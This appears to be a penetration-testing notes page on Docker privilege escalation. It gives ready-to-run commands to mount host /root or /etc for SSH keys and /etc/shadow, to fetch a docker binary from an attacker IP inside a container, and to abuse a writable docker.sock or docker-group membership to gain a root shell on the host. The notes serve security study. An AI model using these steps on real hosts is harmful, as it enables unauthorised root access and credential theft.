# Docker

{% hint style="info" %}
* Docker is a popular open-source tool that provides a portable and consistent runtime environment for software applications. It uses containers as isolated environments in user space that run at the operating system level and share the file system and system resources.
* Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers.
* Running the command `docker run -v /root:/mnt -it ubuntu`  creates a new Docker instance with the /root directory on the host file system mounted as a volume.
* Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user.
* This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.
{% endhint %}

## Docker Architecture <a href="#docker-architecture" id="docker-architecture"></a>

### Docker Daemon

* Also known as the Docker server, is a critical part of the Docker platform that plays a pivotal role in container management and orchestration. Think of the Docker Daemon as the powerhouse behind Docker. It has several essential responsibilities like:
  * running Docker containers
  * interacting with Docker containers
  * managing Docker containers on the host system.

### Docker Clients

* Communicates with the Docker Daemon (through a `RESTful API` or a `Unix socket`) and serves as our primary means of interacting with Docker. We also have the ability to create, start, stop, manage, remove containers, search, and download Docker images.

## Privilege Escalation <a href="#docker-privilege-escalation" id="docker-privilege-escalation"></a>

### Docker Shared Directories

* When using Docker, shared directories (volume mounts) can bridge the gap between the host system and the container's filesystem. With shared directories, specific directories or files on the host system can be made accessible within the container.
* This is incredibly useful for persisting data, sharing code, and facilitating collaboration between development environments and Docker containers. However, it always depends on the setup of the environment and the goals that administrators want to achieve.
* To create a shared directory, a path on the host system and a corresponding path within the container is specified, creating a direct link between the two locations.
* We may find ssh keys of another user from the shared directories

### Docker Sockets

* A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup. It acts as a bridge, facilitating communication between the Docker client and the Docker daemon.
* When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.
* By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources. This remote API access expands the possibilities for distributed Docker setups and remote management scenarios.
* `ls -al` -> `srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock`
* Use the `docker` [binary](https://master.dockerproject.com/linux/x86_64/docker) and upload it to the Docker container, to interact with the socket and enumerate what docker containers are already running.
* _**Inside Container**_
  * `wget https://:<IP>:443/docker -O docker`
  * `chmod +x docker`
  * `ls -l`
  * `/tmp/docker -H unix:///app/docker.sock ps` <sup><sub>(find the image name for which the current container is running)<sub></sup>
  * Create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system.
  * `/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem <existing-image-name>`
  * `/tmp/docker -H unix:///app/docker.sock ps`
  * Log in to the new privileged Docker container with the ID
    * `/tmp/docker -H unix:///app/docker.sock exec -it <newly-created-container-id> /bin/bash`

### Docker Group

* To gain root privileges through Docker, the user we are logged in with must be in the `docker` group. Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root. All three options allow us to work with Docker to escalate our privileges.
* `iduid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)`
* `docker image ls` <sup><sub>(list images)<sub></sup>
* **Docker Socket -** Escalate privileges when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`.
* `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <existing-image-name> chroot /mnt bash`
